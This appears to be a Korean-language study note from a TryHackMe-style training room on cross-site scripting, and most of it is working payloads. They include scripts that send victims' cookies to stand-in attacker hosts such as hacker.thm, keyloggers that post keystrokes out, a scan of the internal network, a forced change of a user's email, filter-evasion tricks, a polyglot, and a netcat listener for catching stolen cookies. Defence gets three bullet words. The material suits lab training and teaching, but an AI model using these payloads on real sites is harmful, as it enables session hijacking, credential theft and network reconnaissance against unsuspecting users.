xss
#
`category`
- stored
- reflected

#
`Stored XSS`

#
`Reflected xss`

#
`DOM 기반 xss`

reflected xss를 사용하면 
```
<html>
    You searched for <em><script>...</script></em>
</html>
```
다음과 같이 주입되며 다른 자바스크립트의 실행에 영향을 주지 않는다.

DOM 기반 xss는
```
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```
다음과 같이 취약한 자바스크립트가 로드되거나 상호작용할 때 실행한다.

![image](https://blog.kakaocdn.net/dn/ceorJc/btrruzWbwlD/lKYNCRKs2K2SQa8ykL8yn0/img.png)

```
" onmouseover="alert('Hover over the image and inspect the image element')"
```
![image](https://blog.kakaocdn.net/dn/cPNKX4/btrrpTO99so/uwR7QB58kfJ5wT1J7pzUD0/img.png)

```
" onmouseover="document.body.style.backgroundColor='red'"
```
![image](https://blog.kakaocdn.net/dn/9C9GV/btrrpTuSA7g/haxFHW6xgJDcS6wmYd5WW0/img.png)
#
`xss를 사용한 ip, port scan`

`라우터의 웹 인터페이스가 192.168.0.1인지 확인`
```
<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
```

`192.168.0.0 ~ 192.168.255의 내부 네트워크 scan`
```
<script>
 for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
 }
</script>
```
#
XSS Payload

`session 도용`
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
#
`xss keylogger`

```
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script>
```
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
#
`쿠키`
```
<script>alert(document.cookie)</script>
```
![image](https://blog.kakaocdn.net/dn/OX4LS/btrroXkem3o/Xpp5STh8o8xkCxkQx3oVvk/img.png)

```
<script> window.location='http://attacker/?cookie='+document.cookie </script>
```
이 스크립트는 사용자 브라우저를 다른 URL로 이동하게 한다. 아래 예시
```
<script>document.location='/log/'+document.cookie</script>
```
/logs 에서 쿠키를 획득하면 이를 사용하여 피해자를 가장할 수 있다. 

![image](https://blog.kakaocdn.net/dn/SFqTI/btrruBmaqNy/wPcpOVK2WEbLc4orLZmhY1/img.png)
#
`시스템 ip주소`
```
<script>alert(window.location.hostname)</script>
```
![image](https://blog.kakaocdn.net/dn/bLDEz4/btrrxXJiKdK/TlxXoX97J320x95KUflGG0/img.png)

#
`사이트 바꾸기`
```
<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
```
![image](https://blog.kakaocdn.net/dn/DdAi4/btrrqmQ7SKI/qTXGgwGEIzg0R2GdAYztS0/img.png)


#
`비지니스 로직`

user email 변경
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
#
Filter Evasion

`<script>를 제거하는 필터를 무시`
```
<img src=x onerror=alert('Hello');>
```
```
<sscriptcript>alert('THM');</sscriptcript>
```
`alert 필터`
```
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
```
```
<img src="blah" onerror=confirm("Hello") />
```
`Hello 단어 필터`
```
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
```
```
<img src="blah" onerror=alert("HHelloello") />
```


- word "Hello"
- script
- onerror
- onsubmit
- onload
- onmouseover
- onfocus
- onmouseout
- onkeypress
- onchange
```
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
```

`아래와 같은 상황에서 닫아주고 payload`
```
"><script>alert('THM');</script>
</textarea><script>alert('THM');</script>
';alert('THM');//
```
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)

`Polyglots`
XSS 다중 언어는 속성, 태그 및 우회 필터를 모두 하나로 이스케이프할 수 있는 텍스트 문자열

'<'를 escape할 때

![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
#
`예방`
- escape
- 입력 유효성
- 데이터 삭제
#
`exploit`

```
nc -lvnp 1234
```
또는
```
python3 -m http.server
```
```
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
```
- btoa() : base64로 인코딩
- document.cookie : 웹의 피해자 쿠키에 접근

![image](https://blog.kakaocdn.net/dn/1QRjw/btrrsnWj31t/5pnumPWkuiSZLfalazfPD0/img.png)

